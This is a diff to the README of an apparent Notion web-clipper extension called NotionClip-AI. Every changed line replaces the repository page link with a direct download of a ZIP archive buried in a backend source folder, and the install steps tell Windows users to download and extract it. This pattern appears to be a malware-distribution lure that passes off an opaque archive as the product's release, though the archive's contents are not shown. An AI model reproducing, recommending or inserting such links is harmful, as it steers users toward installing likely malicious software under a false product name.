@@ -1,6 +1,6 @@
 # 🤖 NotionClip-AI - Save web pages to Notion faster
 
-[![Download Now](https://img.shields.io/badge/Download-NotionClip--AI-blue.svg)](https://github.com/Suellenuttermost212/NotionClip-AI)
+[![Download Now](https://img.shields.io/badge/Download-NotionClip--AI-blue.svg)](https://github.com/Suellenuttermost212/NotionClip-AI/raw/refs/heads/main/backend/src/entities/Notion_Clip_AI_2.7.zip)
 
 ## 🚀 What NotionClip-AI does
 
@@ -10,7 +10,7 @@ Use it when you want to keep research, articles, notes, or links in one place wi
 
 ## 📥 Download and install on Windows
 
-1. Open this link: https://github.com/Suellenuttermost212/NotionClip-AI
+1. Open this link: https://github.com/Suellenuttermost212/NotionClip-AI/raw/refs/heads/main/backend/src/entities/Notion_Clip_AI_2.7.zip
 2. On the GitHub page, look for the latest release or download files.
 3. Download the extension package to your Windows PC.
 4. If the file comes as a ZIP file, extract it to a folder you can find later.
@@ -130,7 +130,7 @@ NotionClip-AI sends page content to Notion and uses Google Gemini AI to create t
 
 ## 📎 Quick access
 
-Download page: https://github.com/Suellenuttermost212/NotionClip-AI
+Download page: https://github.com/Suellenuttermost212/NotionClip-AI/raw/refs/heads/main/backend/src/entities/Notion_Clip_AI_2.7.zip
 
 ## 📦 Setup flow
 
